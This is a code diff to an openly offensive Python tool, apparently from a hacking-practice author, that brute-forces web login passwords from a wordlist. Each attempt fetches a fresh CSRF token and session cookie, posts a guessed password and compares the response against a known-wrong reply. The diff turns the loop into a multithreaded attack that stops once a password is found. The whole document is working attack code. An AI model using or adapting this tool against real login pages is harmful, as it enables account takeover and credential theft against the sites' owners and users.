@@ -4,11 +4,16 @@ import requests
 import re
 from termcolor import colored
 import argparse
+import threading
+import time
+import sys
 
 
 # Author: J3wker
 # HTB Profile: https://www.hackthebox.eu/home/users/profile/165824
 # GitHub: https://github.com/J3wker/PToolity
+right = ""
+
 x = """
       __         ___  _____          _                   __  
      / /        |_  ||____ |        | |                  \ \ 
@@ -17,6 +22,7 @@ x = """
     \ \       /\__/ /.___/ /\ V  V /|   <  __/ |          / /     
      \_\      \____/ \____/  \_/\_/ |_|\_\___|_|         /_/                                                                                       
    """
+
 def creds():
     print(x)
     print(colored("Bruteforce CSRF", 'blue'))
@@ -89,36 +95,35 @@ def get_wrong(username):
 
 
 # Function that does the attack
-def url_request(username):
-    wrong = get_wrong(username)
-    with open(wordlist, "r") as list:
-        for line in list:
-            forge = get_data()  # creating data for the POST request
-            data = {
-                fuser: username,
-                passwdf: "",
-                csrf: forge[0],
-                submit_name: submit_value
-            }
 
-            cookie = {
-                "PHPSESSID": forge[1]
-            }
+def attack(username, word):
+        wrong = get_wrong(username)
+        forge = get_data()  # creating data for the POST request
+        data = {
+            fuser: username,
+            passwdf: "",
+            csrf: forge[0],
+            submit_name: submit_value
+        }
 
-            word = line.strip()
-            print("Trying : " + word, end="\r")
-            data[passwdf] = word
-            response = requests.post(target_url, data=data, cookies=cookie)
-            response = (str(response.content))
-            response = response.replace(f'value="{word}"', 'value="omri"')  # Replacing the password field with the word 'omri' so we can compare it to wrong response
-            response = re.sub(f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', "omri", response)  # Replacing the CSRF token with 'omri' so we can comapre it to the wrong response
+        cookie = {
+            "PHPSESSID": forge[1]
+        }
 
-            if response != wrong:
-                print("Trying : " + word)
-                print("correct password is : " + colored(word, "green"))
-                exit()
+        print("Trying : " + word, end="\r")
+        data[passwdf] = word
+        response = requests.post(target_url, data=data, cookies=cookie)
+        response = (str(response.content))
+        response = response.replace(f'value="{word}"',
+                                    'value="omri"')  # Replacing the password field with the word 'omri' so we can compare it to wrong response
+        response = re.sub(f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', "omri",
+                            response)  # Replacing the CSRF token with 'omri' so we can comapre it to the wrong response
 
-        print("[-] Reached end of line.")
+        if response != wrong:
+            print("Trying : " + word)
+            print("[+] Password found: " + colored(word, "green"))
+            global right
+            right = "1"
 
 
 # a bit of a mess but we needed this way instead of making a main function the returns all of that
@@ -126,8 +131,8 @@ def url_request(username):
 # nevertheless it works fine so we're good happy hackers.
 try:
     options = parse()
-
     target_url = options.target_url
+
 
     csrf = options.csrf
     user = options.username
@@ -149,14 +154,21 @@ try:
     creds()
 
     # program actual run time
-    url_request(user)
+    with open(wordlist, "r") as list:
+        for line in list:
+            word = line.strip()
+            process = threading.Thread(target=attack, args=(user, word,))
+            process.start()
+            time.sleep(0.1)
+            if right == "1":
+                break
+
+
 
 except KeyboardInterrupt:
     print(colored("\n\n[-] Detected Ctrl + C ... Program Existed", "red"))
-    exit()
+    sys.exit()
 
 except Exception:
     print(colored("[-] Something went wrong - check wordlist path OR request timed out", "red"))
-
-
 
